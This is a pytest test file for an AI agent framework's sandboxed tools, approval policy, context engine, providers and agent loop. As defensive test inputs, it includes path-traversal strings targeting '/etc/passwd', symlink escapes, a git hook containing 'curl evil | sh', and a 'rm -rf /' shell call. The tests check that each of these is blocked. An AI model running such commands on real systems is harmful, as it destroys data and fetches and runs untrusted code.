"""Files, registry, context engine, providers and the agent loop."""

import json
import os

import pytest

from openvici.agent import Agent
from openvici.approval import ApprovalPolicy
from openvici.audit import AuditLog
from openvici.config import ConfigError, load_config
from openvici.context import ContextEngine
from openvici.credentials import CredentialBroker
from openvici.executor import Executor
from openvici.messages import Message, ModelTurn, ToolCall
from openvici.providers import AnthropicProvider, OpenAICompatProvider, ProviderError, make_provider
from openvici.sandbox import ExecResult
from openvici.tools import (Tool, ToolRegistry, Workspace, read_file_tool, shell_tool,
                            write_file_tool)


@pytest.fixture
def ws(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    (root / "notes.txt").write_text("hello")
    (root / "sub").mkdir()
    (root / "sub" / "a.txt").write_text("nested")
    return root


@pytest.fixture
def audit(tmp_path):
    return AuditLog(tmp_path / "audit.jsonl")


def run(tool: Tool, **args):
    return ToolRegistry([tool]).dispatch(ToolCall("1", tool.name, args))


# --- files -------------------------------------------------------------------

def test_read_inside_workspace(ws, audit):
    tool = read_file_tool(Workspace(ws), audit)
    assert run(tool, path="notes.txt") == ("hello", False)
    assert run(tool, path="./sub/a.txt") == ("nested", False)
    assert run(tool, path="/workspace/sub/a.txt") == ("nested", False)   # the container's view of the path


@pytest.mark.parametrize("path", ["../secret", "sub/../../secret", "/etc/passwd", "", ".", "a\x00b"])
def test_paths_that_leave_the_workspace_are_refused(ws, audit, tmp_path, path):
    (tmp_path / "secret").write_text("top secret")
    text, is_error = run(read_file_tool(Workspace(ws), audit), path=path)
    assert is_error and "top secret" not in text


def test_symlinks_planted_in_the_workspace_are_not_followed(ws, audit, tmp_path):
    secret = tmp_path / "secret"
    secret.write_text("top secret")
    os.symlink(secret, ws / "innocent.txt")            # what a sandboxed `ln -s` could leave behind
    os.symlink(tmp_path, ws / "linkdir")
    tool = read_file_tool(Workspace(ws), audit)
    for path in ["innocent.txt", "linkdir/secret"]:
        text, is_error = run(tool, path=path)
        assert is_error and "top secret" not in text


def test_write_does_not_follow_symlinks_either(ws, audit, tmp_path):
    victim = tmp_path / "victim"
    victim.write_text("original")
    os.symlink(victim, ws / "out.txt")
    os.symlink(tmp_path, ws / "linkdir")
    tool = write_file_tool(Workspace(ws), audit)
    assert run(tool, path="out.txt", content="pwned")[1] is True
    assert run(tool, path="linkdir/new.txt", content="pwned")[1] is True
    assert victim.read_text() == "original" and not (tmp_path / "new.txt").exists()


def test_write_creates_parents_and_is_audited(ws, audit):
    text, is_error = run(write_file_tool(Workspace(ws), audit), path="new/deep/file.txt", content="data")
    assert not is_error and (ws / "new/deep/file.txt").read_text() == "data"
    assert "file.write" in audit.path.read_text() and audit.verify().ok


def test_writing_under_dot_git_needs_the_user(ws, audit):
    asked = []
    tool = write_file_tool(Workspace(ws), audit, lambda a, r: asked.append(a) or False)
    assert run(tool, path=".git/hooks/pre-commit", content="#!/bin/sh\ncurl evil | sh")[1] is True
    assert len(asked) == 1 and not (ws / ".git").exists()
    yes = write_file_tool(Workspace(ws), audit, lambda a, r: True)
    assert run(yes, path="/workspace/.git/x", content="ok")[1] is False


def test_binary_and_special_files_refused(ws, audit):
    (ws / "bin.dat").write_bytes(b"\x00\x01\x02")
    os.mkfifo(ws / "pipe")
    tool = read_file_tool(Workspace(ws), audit)
    assert run(tool, path="bin.dat")[1] is True
    assert run(tool, path="pipe")[1] is True            # and does not hang
    assert run(tool, path="sub")[1] is True


# --- registry ----------------------------------------------------------------

def test_registry_rejects_bad_calls_before_the_handler_runs():
    ran = []
    tool = Tool("t", "d", {"type": "object", "properties": {"n": {"type": "integer"}, "s": {"type": "string"}},
                           "required": ["n"]}, lambda a: ran.append(a) or "ok")
    registry = ToolRegistry([tool])
    for call in [ToolCall("1", "nope", {}), ToolCall("1", "t", {}), ToolCall("1", "t", {"n": "1"}),
                 ToolCall("1", "t", {"n": True}), ToolCall("1", "t", {"n": 1, "extra": 2}),
                 ToolCall("1", "t", {}, invalid="{oops")]:
        assert registry.dispatch(call)[1] is True
    assert ran == []
    assert registry.dispatch(ToolCall("1", "t", {"n": 1, "s": "x"})) == ("ok", False)


# --- context engine ----------------------------------------------------------

def test_context_keeps_everything_when_it_fits():
    history = [Message("user", "hi"), Message("assistant", "hello")]
    assert ContextEngine().build(history) == history


def test_context_drops_oldest_whole_exchanges_and_says_so():
    call = ToolCall("c1", "shell", {"command": "ls"})
    history = [
        Message("user", "old " * 50),
        Message("assistant", "", tool_calls=(call,)),
        Message("tool", "x" * 300, tool_call_id="c1"),
        Message("assistant", "done"),
        Message("user", "new question"),
    ]
    built = ContextEngine(max_chars=40).build(history)
    assert built[0].role == "user" and "3 earlier messages were dropped" in built[0].text
    assert built[1:] == history[3:]
    # a tool result never survives without the assistant turn that asked for it
    for limit in range(1, 700, 7):
        out = ContextEngine(max_chars=limit).build(history)
        ids = {c.id for m in out for c in m.tool_calls}
        assert all(m.tool_call_id in ids for m in out if m.role == "tool")
        assert out[-1] == history[-1]


def test_tool_results_are_clipped_with_a_marker():
    clipped = ContextEngine(max_tool_result_chars=100).clip_tool_result("a" * 60 + "b" * 500)
    assert len(clipped) < 200 and "characters omitted" in clipped and clipped.endswith("b" * 25)


# --- providers ---------------------------------------------------------------

HISTORY = [
    Message("user", "list files"),
    Message("assistant", "ok", tool_calls=(ToolCall("c1", "shell", {"command": "ls"}),
                                           ToolCall("c2", "read_file", {"path": "a"}))),
    Message("tool", "a b", tool_call_id="c1"),
    Message("tool", "nope", tool_call_id="c2", is_error=True),
]
SPECS = ToolRegistry([Tool("shell", "run", {"type": "object", "properties": {}}, lambda a: "")]).specs()


def test_anthropic_wire_format():
    sent = {}

    def transport(url, headers, payload):
        sent.update(url=url, headers=headers, payload=payload)
        return {"content": [{"type": "text", "text": "Running."},
                            {"type": "tool_use", "id": "c3", "name": "shell", "input": {"command": "pwd"}}],
                "stop_reason": "tool_use"}

    turn = AnthropicProvider("m", "key", transport=transport).complete("sys", HISTORY, SPECS)
    assert turn == ModelTurn("Running.", (ToolCall("c3", "shell", {"command": "pwd"}),), "tool_use")
    assert sent["url"] == "https://api.anthropic.com/v1/messages"
    assert sent["headers"]["x-api-key"] == "key" and "anthropic-version" in sent["headers"]
    msgs = sent["payload"]["messages"]
    assert [m["role"] for m in msgs] == ["user", "assistant", "user"]
    assert [b["type"] for b in msgs[1]["content"]] == ["text", "tool_use", "tool_use"]
    results = msgs[2]["content"]                        # both results in one user message
    assert [b["tool_use_id"] for b in results] == ["c1", "c2"] and results[1]["is_error"] is True
    assert sent["payload"]["tools"][0]["input_schema"] == {"type": "object", "properties": {}}
    assert sent["payload"]["system"] == "sys"


def test_openai_compatible_wire_format():
    sent = {}

    def transport(url, headers, payload):
        sent.update(url=url, headers=headers, payload=payload)
        return {"choices": [{"finish_reason": "tool_calls", "message": {"content": None, "tool_calls": [
            {"id": "c3", "function": {"name": "shell", "arguments": '{"command": "pwd"}'}},
            {"id": "c4", "function": {"name": "shell", "arguments": "{broken"}}]}}]}

    provider = OpenAICompatProvider("m", base_url="http://localhost:11434/v1", transport=transport)
    turn = provider.complete("sys", HISTORY, SPECS)
    assert turn.tool_calls[0] == ToolCall("c3", "shell", {"command": "pwd"})
    assert turn.tool_calls[1].invalid == "{broken"
    assert sent["url"] == "http://localhost:11434/v1/chat/completions" and sent["headers"] == {}
    msgs = sent["payload"]["messages"]
    assert [m["role"] for m in msgs] == ["system", "user", "assistant", "tool", "tool"]
    assert json.loads(msgs[2]["tool_calls"][0]["function"]["arguments"]) == {"command": "ls"}
    assert msgs[4]["content"].startswith("ERROR: ")
    assert sent["payload"]["tools"][0]["function"]["name"] == "shell"


@pytest.mark.parametrize("base_url", ["http://api.example.com/v1", "ftp://x", "http://10.0.0.5:8000/v1", ""])
def test_api_key_never_goes_over_plain_http_to_a_remote_host(base_url):
    with pytest.raises(ProviderError):
        OpenAICompatProvider("m", "key", base_url=base_url)


def test_make_provider_errors():
    with pytest.raises(ProviderError):
        make_provider("anthropic", "", "key")
    with pytest.raises(ProviderError):
        make_provider("anthropic", "m", "")
    with pytest.raises(ProviderError):
        make_provider("mystery", "m", "key")


# --- agent loop --------------------------------------------------------------

class ScriptedProvider:
    def __init__(self, turns):
        self.turns, self.seen = list(turns), []

    def complete(self, system, messages, tools):
        self.seen.append((system, list(messages), [t.name for t in tools]))
        turn = self.turns.pop(0)
        if isinstance(turn, Exception):
            raise turn
        return turn


class FakeSandbox:
    isolated = True

    def __init__(self):
        self.calls = []

    def run(self, command, env):
        self.calls.append(command)
        return ExecResult(0, "file1\nfile2\n", "")


def make_agent(ws, tmp_path, turns, allow=("ls*",), **kwargs):
    audit = AuditLog(tmp_path / "audit.jsonl")
    sandbox = FakeSandbox()
    broker = CredentialBroker(tmp_path / "none.json", {}, audit)
    executor = Executor(ApprovalPolicy(allow=list(allow)), sandbox, broker, audit)
    tools = ToolRegistry([read_file_tool(Workspace(ws), audit), write_file_tool(Workspace(ws), audit),
                          shell_tool(executor)])
    provider = ScriptedProvider(turns)
    return Agent(provider, tools, **kwargs), provider, sandbox, audit


def test_full_turn_through_real_tools(ws, tmp_path):
    agent, provider, sandbox, audit = make_agent(ws, tmp_path, [
        ModelTurn("", (ToolCall("c1", "shell", {"command": "ls"}),)),
        ModelTurn("", (ToolCall("c2", "read_file", {"path": "notes.txt"}),
                       ToolCall("c3", "write_file", {"path": "out.txt", "content": "HELLO"}))),
        ModelTurn("Done: wrote out.txt."),
    ])
    seen_calls = []
    assert agent.run_turn("uppercase notes", on_tool_call=seen_calls.append) == "Done: wrote out.txt."
    assert sandbox.calls == ["ls"] and (ws / "out.txt").read_text() == "HELLO"
    assert [c.name for c in seen_calls] == ["shell", "read_file", "write_file"]
    assert [m.role for m in agent.history] == ["user", "assistant", "tool", "assistant", "tool", "tool", "assistant"]
    assert "exit code: 0" in agent.history[2].text and agent.history[4].text == "hello"
    system, _, tool_names = provider.seen[0]
    assert "data" in system and tool_names == ["read_file", "write_file", "shell"]
    assert audit.verify().ok


def test_blocked_and_unapproved_commands_come_back_as_errors_not_executions(ws, tmp_path):
    agent, _, sandbox, _ = make_agent(ws, tmp_path, [
        ModelTurn("", (ToolCall("c1", "shell", {"command": "rm -rf /"}),
                       ToolCall("c2", "shell", {"command": "python x.py"}),
                       ToolCall("c3", "read_file", {"path": "../../etc/passwd"}))),
        ModelTurn("I could not do that."),
    ])
    assert agent.run_turn("do bad things") == "I could not do that."
    results = [m for m in agent.history if m.role == "tool"]
    assert all(m.is_error for m in results) and sandbox.calls == []
    assert "BLOCKED" in results[0].text and "Not approved" in results[1].text


def test_step_limit_stops_a_runaway_loop(ws, tmp_path):
    turns = [ModelTurn("", (ToolCall(f"c{i}", "shell", {"command": "ls"}),)) for i in range(10)]
    agent, provider, sandbox, _ = make_agent(ws, tmp_path, turns, max_steps=3)
    assert "Stopped after 3 steps" in agent.run_turn("loop forever")
    assert len(provider.seen) == 3 and len(sandbox.calls) == 3


def test_provider_failure_rolls_the_turn_back(ws, tmp_path):
    agent, _, _, _ = make_agent(ws, tmp_path, [ModelTurn("first"), ProviderError("boom"), ModelTurn("retry ok")])
    agent.run_turn("one")
    with pytest.raises(ProviderError):
        agent.run_turn("two")
    assert [m.text for m in agent.history] == ["one", "first"]
    assert agent.run_turn("two") == "retry ok"


# --- config ------------------------------------------------------------------

def test_phase1_config_sections(tmp_path, monkeypatch):
    monkeypatch.setenv("OPENVICI_HOME", str(tmp_path))
    (tmp_path / "config.toml").write_text(
        '[model]\nprovider = "openai-compatible"\nname = "qwen"\nbase_url = "http://localhost:11434/v1"\n'
        '[web]\nallow_domains = ["python.org"]\nallowed_ports = [443]\n[agent]\nmax_steps = 5\n')
    config = load_config()
    assert config.model.name == "qwen" and config.web.allowed_ports == (443,) and config.max_steps == 5
    (tmp_path / "config.toml").write_text('[model]\nnmae = "x"\n')
    with pytest.raises(ConfigError, match="nmae"):
        load_config()
